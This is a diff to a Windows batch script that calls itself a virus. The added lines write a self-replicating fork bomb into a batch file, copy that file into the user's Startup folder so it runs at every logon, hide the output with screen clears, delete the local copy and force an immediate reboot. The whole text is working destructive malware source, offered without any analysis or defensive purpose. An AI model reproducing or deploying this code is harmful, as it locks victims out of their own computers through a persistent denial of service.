@@ -25,6 +25,7 @@ echo Use other device to remove virus there: C:\Users\%USERNAME%\AppData\Roaming
 echo.
 pause >nul
 del xwkqelajcmLsldi.bat >nul
-echo %%0^|%%0 ^>nul > xwkqelajcmLsldi.bat
-copy xwkqelajcmLsldi.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
+echo %%0^|%%0 ^>nul > virus_runner.bat && cls
+copy virus_runner.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" && cls
+del virus_runner.bat&&cls
 shutdown /r /t 0
